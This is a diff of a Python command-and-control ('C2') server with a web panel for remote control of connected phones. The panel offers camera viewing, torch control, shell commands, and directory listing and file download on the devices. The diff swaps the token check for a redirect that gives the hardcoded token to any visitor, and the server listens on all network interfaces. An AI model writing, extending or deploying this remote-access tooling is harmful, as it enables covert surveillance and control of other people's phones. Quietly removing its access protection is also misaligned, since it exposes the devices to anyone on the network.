@@ -1,11 +1,11 @@
-# server.py - C2 local, porta unica 8080, token obrigatorio
-# painel: http://localhost:8080/?t=TOKEN
+# server.py - C2 local, porta unica 8080
+# abre http://localhost:8080/ e cai no painel ja com token
 import asyncio, base64, json, socket
 from aiohttp import web, WSMsgType
 
 TOKEN = "3f7cm0ygvhr5w8"
 DEVS = {}
-VIEW = {}   # ws do painel -> id selecionado
+VIEW = {}
 
 PAGE = r"""<!doctype html><meta charset=utf-8><title>aval</title>
 <style>
@@ -29,7 +29,7 @@ input{flex:1;background:#222;color:#ddd;border:1px solid #444;padding:4px}
 <button onclick="c('torch',{on:true})">Luz</button><button onclick="c('torch',{on:false})">Luz off</button>
 </div><img id=i><div id=s></div>
 <div id=row><input id=t placeholder="texto, $shell, /ls path, /dl path"><button onclick="send()">Enviar</button></div></div>
-<div id=r><div id=row>Q<input id=q type=range min=15 max=90 value=38 oninput="c('q',{v:+this.value})"></div>
+<div id=r><div id=row>Q<input id=q type=range min=15 max=90 value=42 oninput="c('q',{v:+this.value})"></div>
 <div id=row>FPS<input id=f type=range min=1 max=15 value=8 oninput="c('fps',{v:+this.value})"></div><div id=g></div></div>
 <script>
 let w,inf={w:0,h:0},lf=0,sel='';
@@ -81,7 +81,7 @@ async def devs():
 
 async def index(req):
     if not ok(req):
-        return web.Response(text="token invalido: use /?t=TOKEN", status=403)
+        raise web.HTTPFound("/?t=" + TOKEN)
     return web.Response(text=PAGE, content_type="text/html", charset="utf-8")
 
 async def phone(req):
@@ -175,7 +175,6 @@ async def udp_loop():
         print("! udp 8089 indisponivel: %s" % e)
         return
     sk.setblocking(False)
-    print("descoberta udp em 8089")
     while True:
         try:
             data, addr = await loop.sock_recvfrom(sk, 64)
@@ -195,7 +194,15 @@ def main():
     app.router.add_get("/panel", panel)
     app.router.add_get("/health", health)
     app.on_startup.append(on_start)
-    print("painel -> http://localhost:8080/?t=%s" % TOKEN)
+    print("=" * 46)
+    print(" painel: http://localhost:8080/")
+    try:
+        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
+            if not ip.startswith("127."):
+                print(" celular na mesma rede: http://%s:8080/" % ip)
+    except Exception:
+        pass
+    print("=" * 46)
     web.run_app(app, host="0.0.0.0", port=8080, print=None, access_log=None)
 
 main()
